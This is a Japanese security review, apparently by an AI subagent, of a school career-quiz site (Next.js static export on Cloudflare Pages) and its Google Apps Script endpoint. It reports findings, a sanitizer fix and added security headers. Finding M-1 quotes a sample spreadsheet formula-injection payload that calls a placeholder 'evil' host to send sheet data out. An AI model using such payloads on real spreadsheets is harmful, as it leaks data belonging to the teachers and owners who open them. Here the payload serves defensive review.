# ring-map（circle-app）セキュリティレビュー 2026-06-14

レビュアー: セキュリティ専門サブエージェント（Claude）
対象: `circle-app/`（Next.js 16 / output:"export" → Cloudflare Pages, 本番 https://ring-map.com）
     `scripts/apps-script/code.gs`（Google Apps Script 集計エンドポイント）
権限: L0/L1 のみ実行（ファイル作成・編集・commit・build）。push／本番デプロイ／トークン
     ローテーション／依存更新は L2 として「推奨」に留めた。
照合した正本: `.company/ORG-MAP.md`, `.company/secretary/STATUS.md`(ring-map欄),
     `.company/secretary/notes/circle-app-overview.md`

---

## サマリー（深刻度別 所見数）

| 深刻度 | 件数 | 概要 |
|---|---|---|
| Critical | 0 | — |
| High | 0 | — |
| Medium | 2 | M-1 Sheets 数式インジェクション（GAS） / M-2 Next.js 依存脆弱性（静的配信のため実適用は限定的） |
| Low | 3 | L-1 セキュリティヘッダ未設定（→実装で解消） / L-2 自由入力欄に maxLength なし（一部） / L-3 自動生成スパムの残余リスク |
| Info | 4 | I-1 公開トークン設計の妥当性 / I-2 PII の取扱い / I-3 no-cors+text/plain の妥当性 / I-4 out/ に機密混入なし |

実装した保護: `public/_headers`（Cloudflare Pages セキュリティヘッダ）1件。`npm run build` 通過・`out/_headers` 生成確認済み。

---

## 秘書の予備スキャン結果の再確認

| # | 予備所見 | 本レビューの判定 |
|---|---|---|
| 1 | .env・鍵は Git 未追跡、.gitignore 整備済み | ✓ 確認。`git ls-files` に .env/.pem/.DS_Store/out/.next/tsbuildinfo の追跡なし |
| 2 | 追跡ファイルに実鍵パターンなし | ✓ 確認。下記 I-1 のトークンのみ（設計上の公開トークン） |
| 3 | SHARED_TOKEN は設計上の公開トークン | ✓ 妥当（I-1 参照）。真の秘密ではないが偽POSTふるい落としとして合理的 |
| 4 | public/_headers なし | ✓ 確認 → **実装で解消（下記）** |
| 5 | npm audit: Next high/moderate | ✓ 確認。ただし static export では大半が実適用外（M-2 参照） |
| 6 | Apps Script は doPost のみ・検証あり | ✓ 確認。doGet なし＝閲覧の口なし。token＋13桁D1/C1検証＋日次上限あり |
| 7 | 外部接続先 script.google.com / PostHog | ✓ script.google.com は実使用。**PostHog はコメント言及のみで未実装**（posthog-js 不在）。CSP の connect-src 検討時、現状の実接続先は script.google.com のみ |

---

## 所見詳細

### M-1 [Medium] Google Sheets 数式（CSV/Formula）インジェクション — GAS 側 ✅ 実装済み（2026-06-14）

> **実装済み**: `code.gs` に `sanitizeCell()` を追加し、ユーザー起源の自由記述フィールドへ適用。
> 仕様: 値が文字列かつ先頭が `= + - @` / tab(0x09) / CR(0x0D) のとき先頭に `'` を前置（表示は実質不変・数式評価のみ無効化）。非文字列・空はそのまま。
> 構文確認: `cp code.gs /tmp/m1check.js && node --check` → SYNTAX_OK（チェック後 trash 済み）。
>
> **適用フィールド一覧**（`appendRow` の各引数を目視確認のうえ、ユーザー自由入力のみに適用）:
> | 書込先（関数 / シート） | 適用フィールド |
> |---|---|
> | `handleDiagnosis` / マスタ diagnoses | `school_code`（`OTHER_<自由入力>` を含みうるため）, `school_name` |
> | `handleSatisfaction` / マスタ satisfactions | `reason`, `desired_field1`, `desired_field2`, `desired_field3`, `desired_reason` |
> | `handleSatisfaction` / 学校別 feedback | `reason`, `desired_field1`, `desired_field2`, `desired_field3`, `desired_reason` |
>
> **適用しなかったもの（意図的）**: 数値項目（適合度 top1〜3_score・所要時間 duration_sec・年齢）、`toNumberOrKeep` 済みの klass/student_number、アプリ生成の固定値（日時・session_id・version・top1〜3_name・categories・change_log・school_mode・school_pref・school_type・grade・satisfaction・start/end_time）。`handleDiagnosis` の学校別 students シートはユーザー自由記述フィールドを持たないため対象なし。
> **コミット**: `302c3b9`（push・再デプロイはせず、保留中の「Apps Script 22軸再デプロイ」でオーナーが貼り直す際に一緒に有効化される）。


- **場所**: `scripts/apps-script/code.gs` の `appendRow`（handleDiagnosis / handleSatisfaction）。
  自由入力でシートに書かれる値: 学校名「その他」入力（`OTHER_<name>` / `school_name`）、
  納得感の理由 `reason`、希望学部の「その他」入力（`その他: <入力>`）、`desired_reason`。
- **リスク**: 生徒が `=HYPERLINK("http://evil/?"&join(...))` や `=IMPORTDATA(...)`,
  `=IMAGE(...)`, `@`/`+`/`-`/`=` 始まりの値を入力すると、Apps Script の `appendRow` は
  それを**ライブ数式としてセルに書き込む**。先生やオーナーが Sheets を開いた瞬間に評価され、
  シート内データの外部送信（exfiltration）や不正リンク表示が起こりうる。
  これは「静的サイトの XSS」ではなく「集計先スプレッドシートへの式注入」。被害者は閲覧する**先生/オーナー**。
- **悪用度**: 中。学校モードで生徒が直接入力できる経路があり、被害は閲覧者のスプレッドシート。
  ただし攻撃者は token を要する（公開トークンなので抽出は可能）＝ハードルは低くない範囲。
- **推奨対応（GAS 側・要再デプロイ＝L2）**: `appendRow` に渡す前に、文字列セル値の先頭が
  `= + - @ tab CR` のいずれかなら先頭にアポストロフィ `'` か全角化を施す sanitize 関数を通す。
  例: `function safeCell(v){ if(typeof v==='string' && /^[=+\-@\t\r]/.test(v)) return "'"+v; return v; }`
  本レビューでは **code.gs を勝手に書き換えない**（フロントと無関係に GAS だけ再デプロイが必要で、
  デプロイはオーナー手作業。STATUS で「Apps Script は旧19軸のまま再デプロイ待ち」と整合させるため、
  この sanitize もその再デプロイ時にまとめて入れるのが安全）。→ オーナー GO 待ち推奨。
- **フロント側の補助（任意・低リスク）**: 入力時点で先頭記号を弾く/エスケープしてもよいが、
  根本対策は書き込み側（GAS）。フロントだけでは token 直叩きを防げない。

### M-2 [Medium→実適用Low] Next.js 16.2.4 の既知脆弱性
- **npm audit --omit=dev**: next に high 1・moderate(postcss) 1。fix=next@16.2.9。
- **実適用性評価**: 列挙された advisory はいずれも**サーバ実行コンポーネント前提**:
  Middleware/Proxy bypass・redirect cache poisoning、RSC の DoS / cache poisoning、
  Image Optimization API、WebSocket upgrade SSRF、beforeInteractive scripts XSS、
  CSP nonce XSS、Cache Components DoS。**本番は output:"export" の純静的配信**で
  Next サーバ・middleware・RSC ランタイム・Image Optimization API は**存在しない**ため、
  これらは実適用外。postcss の XSS はビルド時のCSS生成の話で、信頼できる自前CSSのみ処理＝実害なし。
- **結論**: 静的配信における実リスクは Low。ただし**将来 SSR/middleware を導入したら即 High 化**する。
- **推奨**: 急がないが next@16.2.9 への更新は望ましい。**AGENTS.md が「これは普通の Next.js では
  ない・破壊的変更あり」と警告**しているため、勝手に上げない。上げるなら別ブランチで
  `npm install next@16.2.9` → `npm run build` 通過確認 → 全ページ手動確認（特に quiz/result の
  ハイドレーション）→ デプロイ。マイナーでも破壊的変更ありうる前提でテスト必須。→ L2 推奨に留置。

### L-1 [Low] セキュリティレスポンスヘッダ未設定 → **本レビューで実装・解消**
- Cloudflare Pages にヘッダ設定がなく、X-Frame-Options 等が一切付与されていなかった。
- **実装**: `public/_headers` を新規作成（下記「実装した保護」）。`npm run build` で
  `out/_headers` に複製されることを確認（diff 一致）。Cloudflare Pages はこのファイルを配信時に読む。

### L-2 [Low] 一部の自由入力欄に maxLength 未設定
- `result/page.tsx` の reason/desired は maxLength={500}/{50} 済み（良）。
- 一方 `s/select/page.tsx` の学校名「その他」入力（otherName）、`s/info/page.tsx` の
  クラス・出席番号入力には maxLength 指定がない。巨大文字列を入れられても GAS の token 検証で
  弾けない正規ユーザー経路では、Sheets セルへ長大文字列が入りうる（可用性・見栄えの問題）。
- 影響は軽微（DoS にはならない／GAS は素直に1セルに格納）。**触ってよい範囲だが本案件の主眼でないため
  未実施**。入れるなら otherName=maxLength 60、klass/number=maxLength 6 程度を推奨。判定式・質問・
  スコアリングには無関係なので安全に追加可能。

### L-3 [Low] 学校別 Sheets 自動生成のスパム残余リスク
- 既存対策は妥当: token 検証＋`isValidSchoolCode`（13桁・D1/C1始まりのみ）＋
  `DAILY_AUTOCREATE_CAP=5`＋上限到達時オーナー通知（当日1回）。マスタ記録は継続しデータは失わない。
- 残余リスク: 攻撃者が**実在の13桁 D1/C1 コードを総当たり**すれば、1日5校まで偽 Sheets を
  生成させられる（Drive 圧迫・偽通知メール）。文科省コードは公開情報で総当たり可能。
- 影響は低（上限5・通知あり・マスタ汚染のみで個人特定情報は偽データ）。現設計で許容範囲だが、
  急増通知が来たら SHARED_TOKEN ローテーション（L2）を検討、という運用で十分。追加実装不要。

### I-1 [Info] 公開トークン `SHARED_TOKEN` 設計の妥当性
- 値 `b24ea11b...` は code.gs / result/page.tsx / result-v/page.tsx /
  DEPLOY-2026-06-02-security.md にコミット済み、かつビルド成果物
  `out/_next/static/chunks/*.js` にも当然含まれる（静的サイトなのでクライアント JS から抽出可能）。
- **これは真の秘密ではなく、設計上の公開トークン**（コード内コメントにも明記）。役割は
  「無差別な偽 POST・bot のふるい落とし」。評価: **妥当**。静的サイトでサーバ秘密を持てない以上、
  これ以上の認証（reCAPTCHA 等）はUX/実装コストに見合わず、収集データの性質（匿名統計・任意の自由記述）
  からも過剰。**機密ではないので「漏えい」ではない**。ローテーションはフロント＋GAS 同時差し替え＋
  両者再デプロイが必要なため L2（オーナー作業）。日常的に回す必要はなく、スパム急増時のみ。

### I-2 [Info] PII（個人情報）の取扱い
- 設計は良好。マスタ Sheets は**個人特定情報を含めない**（クラス・出席番号を明示的に捨てる、
  code.gs handleDiagnosis コメント・実装で確認）。クラス・出席番号は学校別 Sheets のみ。
- 回答内容そのものは localStorage 内に留まり外部送信しない旨を privacy ページに明記（確認済み）。
- 年齢は任意。session_id は `crypto.randomUUID()` の匿名 ID。プライバシーポリシー記載と実装が整合。
- 留意: 学校別 Sheets には生徒の進路志向＋クラス・出席番号という**準個人情報**が入る。Drive 権限
  （閲覧専用で当該校の先生のみ共有）の運用徹底が重要。これは技術ではなく運用統制（オーナーの共有設定）。

### I-3 [Info] no-cors + text/plain 送信の妥当性
- フロントは `mode:"no-cors"` + `Content-Type: text/plain` で POST。これは Apps Script への
  CORS プリフライト回避の定石で、**意図的かつ妥当**。レスポンスは opaque で読めないが、
  「書き込まれること」が目的なので問題なし。CSRF 的観点でも、書かれるデータは送信者自身の診断結果のみで
  改ざん旨味がなく、token でbotを弾く設計と整合。

### I-4 [Info] ビルド成果物 out/ の混入物チェック
- `out/` に sourcemap（*.map）なし、.env/.pem なし。混入は公開トークン（設計通り）のみ。
- `out/` は .gitignore 済み（Cloudflare が自前ビルドするため）。.DS_Store も gitignore 済み。問題なし。

---

## 実装した保護（コミット対象）

### `public/_headers`（新規）
Cloudflare Pages 用のセキュリティヘッダ。output:"export" で `out/_headers` に複製され、
Cloudflare Pages が各レスポンスに付与する（ビルドで複製・diff 一致を確認済み）。

| ヘッダ | 値 | 目的 |
|---|---|---|
| X-Frame-Options | DENY | クリックジャッキング防止 |
| X-Content-Type-Options | nosniff | MIME スニッフィング無効化 |
| Referrer-Policy | strict-origin-when-cross-origin | リファラ漏えい最小化 |
| Permissions-Policy | camera/mic/geo/payment/usb/cohort 全無効 | 不要機能のブロック |
| Content-Security-Policy | frame-ancestors 'self' | 埋め込み制限（script-src は触らない＝壊れない） |
| Cross-Origin-Resource-Policy | same-origin | 他オリジンからの誤読み込み対策 |
| Strict-Transport-Security | max-age=63072000; includeSubDomains; preload | HTTPS 強制 |

**CSP（script-src 等の本格 CSP）は意図的に見送り**。理由: Next.js は static export でも
ハイドレーション用 **inline `<script>` を出力**する（out/index.html で確認）。script-src を
'self' に絞ると 'unsafe-inline'/nonce なしでサイトが壊れ、静的サイトでは nonce 配布手段がない。
'unsafe-inline' を許す緩い CSP は保護価値が乏しく見送り。付与した CSP は frame-ancestors のみで
スクリプト実行に影響しない安全な指定。将来 inline を排除できたら Report-Only から段階導入する。

`npm run build` 通過確認済み（17ページ static prerender 成功、エラーなし）。

---

## GO 待ち推奨事項（L2・オーナー作業）

1. ~~**M-1 sanitize の GAS 反映**~~ → **✅ 実装済み（2026-06-14）**: code.gs に `sanitizeCell()` を追加・
   コミット済み（push・デプロイはしていない）。**保留中の「Apps Script 22軸再デプロイ」でオーナーが
   貼り直す際に一緒に有効化される**（単独再デプロイ不要）。詳細は上の M-1 節参照。
2. **M-2 Next 更新**: next@16.2.4→16.2.9。静的配信では実リスク Low のため急がない。上げる場合は
   AGENTS.md 警告に従い別ブランチでビルド＋全ページ手動確認。
3. **SHARED_TOKEN ローテーション**: 日常的には不要。自動生成スパム急増の通知が来たときのみ、
   フロント＋GAS 同時差し替え＋両者再デプロイ。
4. **Drive 共有権限の運用徹底**: 学校別 Sheets は当該校の先生に閲覧専用でのみ共有（準個人情報）。

## 残リスク（受容）

- **公開トークンの抽出可能性**（I-1）: 静的サイトの構造上不可避。設計通りで受容。
- **実在校コード総当たりによる自動生成 5件/日**（L-3）: 上限・通知ありで影響小。受容。
- **M-1 の数式注入**: code.gs 側の対策は**コード上は実装済み（2026-06-14）**。ただし push・再デプロイ
  はしていないため、本番 Apps Script に反映されるのは保留中の「Apps Script 22軸再デプロイ」をオーナーが
  実施した時点。それまでは本番で残存。学校配布は夏休み（7月後半〜）で実トラフィック前に再デプロイの余裕あり。

## 触っていないもの（指示通り）
判定式・質問・スコアリング（scoring.ts/questions.ts/departments.ts）・リング描画は一切変更なし。
code.gs は M-1 sanitize（`sanitizeCell()`）のみ追加（2026-06-14）。それ以外のロジック
（parseAxisScores / toNumberOrKeep / sortSchoolSheet / 判定式・スコアリング）は不変。push・再デプロイなし。
既存の未コミット作業（ring-design-preferences.md / v2_verify.ts / analysis 配下）には触れず、
本セキュリティ成果物のみをコミットする。
